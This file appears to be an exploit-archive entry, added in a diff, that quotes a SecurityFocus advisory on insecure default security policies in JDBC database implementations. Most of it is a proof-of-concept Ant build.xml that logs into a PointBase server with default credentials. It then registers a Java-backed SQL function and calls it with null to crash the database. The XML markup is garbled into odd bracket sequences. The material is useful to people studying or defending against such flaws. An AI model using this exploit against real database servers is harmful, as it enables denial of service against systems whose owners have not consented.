@@ -1,0 +1,38 @@
+source: http://www.securityfocus.com/bid/9444/info
+
+It has been reported that multiple JDBC database implementations include insecure default security policies. This could expose vulnerable databases to denial of service attacks. This could also permit remote attackers to execute arbitrary commands on systems hosting vulnerable implementations in some circumstances.
+
+======================build.xml=======================
+
+.(.!-- pointbase denial-of-service by marc schoenefeld --".).
+
+.(.project default="dos".).
+
+.(.property name="host" value="192.168.0.7"/.).
+
+.(.target name="dos".).
+.(.sql
+driver="com.pointbase.jdbc.jdbcUniversalDriver"
+url="jdbc:pointbase://${host}:9092/sample"
+userid="pbpublic"
+password="pbpublic"
+print="true"
+.).
+.(.![CDATA[
+//DROP FUNCTION CRASH5(VARCHAR(20));
+CREATE FUNCTION CRASH5(IN P1 VARCHAR(20)) RETURNS VARCHAR(20) LANGUAGE JAVA
+NO SQL EXTERNAL NAME "sun.misc.MessageUtils::toStderr" PARAMETER STYLE SQL;
+SELECT CRASH5(null) from SYSUSERS;
+]].).
+.(.classpath.).
+.(.pathelement location="pbclient.jar"/.).
+.(./classpath.).
+
+.(./sql.).
+
+.(./target.).
+
+.(./project.).
+
+
+======================build.xml=======================
